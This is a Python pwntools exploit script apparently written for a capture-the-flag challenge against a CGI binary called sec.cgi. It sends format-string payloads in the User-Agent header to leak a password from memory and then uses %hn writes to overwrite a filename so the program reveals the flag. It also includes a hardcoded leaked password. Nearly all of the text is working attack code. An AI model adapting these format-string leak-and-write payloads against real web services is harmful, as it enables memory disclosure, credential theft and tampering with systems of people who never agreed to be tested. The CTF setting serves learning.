import requests
from pwn import *
from os import system

exe = ELF("./sec.cgi")
context.binary = exe

url = "https://nessus-braggart.chals.io/sec.cgi"
password = b'xbYP3h7Ua94c'		# Leaked password

'''
To test it in LOCAL:
	- export AdminPass="S3cur3P4sSw0rd"
	- export HTTP_X_DEBUG="1"
	- export REMOTE_ADDR="10.10.10.10"
	- export HTTP_X_PASSWORD="<leaked_password>"
	- export HTTP_USER_AGENT="<format_string_to_send>"
	- export workingDir="<actual_working_directory"
	- ./sec.cgi
'''

# NOTE: For some reason, getting inside "printSecret" by changing the GOT entry of "puts" doesn't work properly after "malloc"

def send_request(format: bytes, psw: bytes = "R4nd0mP4sSw0rd"):
	headers = {
		"Content-Type": "text/html",
		"X-DEBUG": "1",
		"X-PASSWORD": psw,
		"USER-AGENT": format
	}

	response = requests.get(url, headers=headers)
	print(response.text)		# Password is in the response


def leak_password():
	format = (b'A' * 1008) + b'%275$s'
	send_request(format=format)


def change_filename():
	format = (b'A' * 1008) + f'%{0x6c66}c%267$hn'.encode('ascii')	# Instead of printing "flag", we can change "br" of "brag" with "fl" (little-endian so it's placed reversed)
	send_request(format=format, psw=password)


def main():
	if password is None:
		leak_password()
	else:
		change_filename()


if __name__ == '__main__':
	main()